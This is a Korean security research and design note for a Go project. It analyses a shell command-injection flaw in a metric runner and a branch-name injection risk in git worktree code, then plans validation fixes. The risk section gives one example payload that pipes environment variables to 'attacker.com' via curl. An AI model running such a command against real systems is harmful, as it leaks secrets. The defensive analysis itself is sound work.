# SPEC-AXSEC-001 리서치

## 기존 코드 분석

### Issue 1: Command Injection in metric.go

**경로**: `pkg/experiment/metric.go:48-50`

```go
func RunMetric(ctx context.Context, cmd string) (MetricOutput, error) {
    c := exec.CommandContext(ctx, "sh", "-c", cmd)
    rawBytes, err := c.Output()
```

**호출 체인**:
- `internal/cli/experiment.go:95` → `experiment.RunMetricWithTimeout(cfg, f.metric)`
- `f.metric`은 CLI `--metric` 플래그에서 옴 (cobra flag)
- `RunMetricMedian`도 내부에서 `RunMetric`을 호출

**현재 보호**: 없음. `@AX:WARN` 주석만 존재.

**위험도**: `sh -c`에 직접 전달되므로, `--metric "echo ok; curl attacker.com/steal?$(env)"` 같은 입력으로 환경변수 유출 가능. CLI 플래그라 직접적인 원격 공격 벡터는 아니지만, SPEC config에서 로드되는 경로가 추가되면 위험 확대.

### Issue 2: Branch Name Injection in worktree.go

**경로**: `pkg/pipeline/worktree.go:85-107`

```go
func (m *WorktreeManager) addWorktreeWithRetry(ctx context.Context, dir, branch string) error {
    // ...
    args = append(args, "-b", branch)
    // ...
    cmd := exec.CommandContext(ctx, "git", args...)
```

**호출 체인**:
- `Create(ctx, branch)` → `sanitizeBranchName(branch)` → `addWorktreeWithRetry(ctx, dir, wtBranch)`
- `Create`는 pipeline 내부에서 호출 (현재 하드코딩된 phase 이름)

**현재 보호**: `sanitizeBranchName`이 `Create`에서 호출되지만, `addWorktreeWithRetry`는 이를 강제하지 않음. `addWorktreeWithRetry`를 직접 호출하는 새 코드가 추가되면 sanitize를 건너뛸 수 있음.

**sanitizeBranchName 분석** (`worktree.go:161-175`):
- `strings.NewReplacer`로 특정 문자를 `-`로 치환
- `..`, `;`, `|`, `$`, `` ` `` 등 shell metacharacter는 치환 목록에 없음
- `git -b` 인자는 shell이 아닌 exec 직접 호출이므로 shell injection 위험은 낮음
- 그러나 git 자체의 branch name 파싱에서 예상 외 동작 가능 (예: `-`로 시작하는 이름은 git 옵션으로 해석)

### 기존 테스트 패턴

**metric_test.go**: `testify/assert`, `testify/require` 사용, `t.Parallel()` 패턴
**worktree_test.go**: `pipeline_test` 패키지 (외부 테스트), Given-When-Then 주석 패턴

## 설계 결정

### D1: 별도 파일 vs 인라인

**결정**: 검증 로직을 별도 파일(`cmdvalidate.go`, `branchvalidate.go`)로 분리

**이유**:
- `metric.go`는 200줄로 파일 사이즈 제한 경고 범위. 검증 로직 추가 시 초과 가능
- `worktree.go`도 200줄. 동일한 이유
- 별도 파일은 검증 로직만 독립적으로 테스트 가능

**대안**: 인라인 추가 — 파일 크기 제한 위반 위험, 단일 책임 원칙 위반

### D2: Blocklist vs Allowlist

**결정**: 기본 blocklist (disallowed metacharacters) + opt-in bypass

**이유**:
- Allowlist는 `echo`, `python`, `go run` 등 합법적 명령의 인자까지 제한하여 오탐이 많음
- Blocklist는 명확한 위험 패턴만 차단하여 기존 사용 패턴과 호환
- `AllowShellMeta` opt-in으로 파이프라인이 필요한 고급 사용자에게 escape hatch 제공

**대안 검토**:
1. Allowlist (허용된 명령어 목록) — 너무 제한적, 사용자 경험 악화
2. Sandbox execution (nsjail, firejail) — 인프라 의존성 추가, 과도한 복잡성
3. 정규식 기반 명령어 파싱 — shell 문법의 복잡성으로 정확한 파싱 불가능

### D3: sanitizeBranchName 시그니처 변경

**결정**: `(string) → (string, error)` 시그니처 변경

**이유**:
- Silent replacement는 예상치 못한 branch name 생성 가능 (`..exploit` → `--exploit`)
- Error 반환으로 호출자에게 명시적 실패 신호 전달
- 호출부(`Create`)에서 에러 처리 필요 — 1곳만 수정

**대안**: 현재 시그니처 유지 + 별도 validate 함수 추가 — 가능하지만 sanitize와 validate 역할 중복

### D4: `addWorktreeWithRetry` 내부 검증

**결정**: 함수 진입부에 regex 검증 추가 (defense-in-depth)

**이유**:
- `sanitizeBranchName`이 호출되었더라도 이중 검증으로 안전망 확보
- `addWorktreeWithRetry`가 private이지만, 패키지 내 새 호출부가 추가될 가능성 존재
- 검증 비용은 regex 1회 매칭으로 무시 가능

## 참고

- Go `os/exec` 패키지는 `exec.Command`에서 shell을 거치지 않으므로, `exec.CommandContext(ctx, "git", args...)`는 argument injection에는 취약하지 않음. 단 `-`로 시작하는 인자는 git 옵션으로 해석될 수 있음.
- `sh -c`를 사용하는 `RunMetric`은 shell을 직접 호출하므로, 모든 shell metacharacter가 해석됨.
